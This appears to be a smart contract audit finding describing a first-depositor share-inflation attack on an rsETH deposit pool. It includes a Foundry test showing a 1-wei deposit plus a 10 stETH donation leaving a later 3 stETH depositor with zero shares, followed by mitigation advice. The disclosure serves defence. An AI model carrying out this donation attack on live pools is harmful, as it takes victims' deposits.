# First depositor is able to break shares minting 

* In order to calculate rsETH/LST exchange rate, the protocol utilizes the following formula: 
  * $$ rsethAmountToMint = Q(amount) * \frac{rsEthSupply}{totalETHInPool} $$
    * `Q(amount)` - is eth backed by amount of provided LST.
* Which could be manipulated by obtaining very small amount of shares(e.g. 1wei) and then donating a huge amount of LSTs directly into the pool. Due to the rounding issue, subsequent depositors will receive 0 shares, unless further lst amount provided is not more than amount donated by an attacker. 
  

## Proof of Concept
* I've slightly modified `setUp()` in `LRTDepositPoolTest.t.sol` in order to replace `LRTOracleMock` with `LRTOracle` for testing purposes:
  * ```Solidity
        function setUp() public virtual override(RSETHTest, BaseTest) {
            super.setUp();

            // deploy LRTDepositPool
            ProxyAdmin proxyAdmin = new ProxyAdmin();
            LRTDepositPool contractImpl = new LRTDepositPool();
            TransparentUpgradeableProxy contractProxy = new TransparentUpgradeableProxy(
                address(contractImpl),
                address(proxyAdmin),
                ""
            );
            
            lrtDepositPool = LRTDepositPool(address(contractProxy));

            // initialize RSETH. LRTCOnfig is already initialized in RSETHTest
            rseth.initialize(address(admin), address(lrtConfig));
            vm.startPrank(admin);
            // add rsETH to LRT config
            lrtConfig.setRSETH(address(rseth));
            // add oracle to LRT config
            lrtConfig.setContract(LRTConstants.LRT_ORACLE, address(new LRTOracle()));
            lrtConfig.setContract(LRTConstants.LRT_DEPOSIT_POOL, address(lrtDepositPool));
            LRTOracle(lrtConfig.getContract(LRTConstants.LRT_ORACLE)).initialize(address(lrtConfig));

            LRTOracle(lrtConfig.getContract(LRTConstants.LRT_ORACLE)).updatePriceOracleFor(address(rETH), address(new LRTOracleMock(1.09149e18)));
            LRTOracle(lrtConfig.getContract(LRTConstants.LRT_ORACLE)).updatePriceOracleFor(address(stETH), address(new LRTOracleMock(0.99891e18)));
            LRTOracle(lrtConfig.getContract(LRTConstants.LRT_ORACLE)).updatePriceOracleFor(address(cbETH), address(new LRTOracleMock(1.05407e18)));

            lrtDepositPool.initialize(address(lrtConfig));
            // add minter role for rseth to lrtDepositPool
            rseth.grantRole(rseth.MINTER_ROLE(), address(lrtDepositPool));

        }
    ```
* The test to demonstrate an issue:
  * ```Solidity
      function test_DepositAsset() external {
        vm.startPrank(alice);


        rETH.approve(address(lrtDepositPool), 1 wei);
        lrtDepositPool.depositAsset(rETHAddress, 1 wei);

        stETH.transfer(address(lrtDepositPool), 1e19);

        vm.stopPrank();

        vm.startPrank(bob);

        // bob balance of rsETH before deposit
        uint256 bobBalanceBefore = rseth.balanceOf(address(bob));

        stETH.approve(address(lrtDepositPool), 3 ether);
        lrtDepositPool.depositAsset(address(stETH), 3 ether);

        // bob balance of rsETH after deposit
        uint256 bobBalanceAfter = rseth.balanceOf(address(bob));
        vm.stopPrank();

        assertEq(bobBalanceAfter - bobBalanceBefore, 0, "Bob's balance has changed");
    }

* Logs:
* ```bash
    [PASS] test_DepositAsset() (gas: 379116)
        Logs:
        rsEthSupply:  0
        rsETHPrice:  1000000000000000000
        rsethAmount to mint:  1 // an attacker dropped 1 wei of rETH
        rsEthSupply:  1
        price of asset:  998910000000000000
        total amount of assets in pool:  10000000000000000000 // 10 stETH donated by an attacker
        price of asset:  1091490000000000000
        total amount of assets in pool:  1
        price of asset:  1054070000000000000
        total amount of assets in pool:  0
        total eth in pool:  9989100000000000001091490000000000000
        rsETHPrice:  9989100000000000001091490000000000000 // overinflated price
        rsethAmount to mint:  0 // amount of rsETH shares minted after 3 stETH being deposited
    ```

## Recommended Mitigation Steps
- Short term: 
  - Mint some amount of dead shares to `address(0)`, when the `totalSupply() == 0` as it's done in [`UniswapV2Pair.sol`](https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Pair.sol#L119-L124)
  - Also, prevent minting 0 amount of shares.
  
- Long term: N/A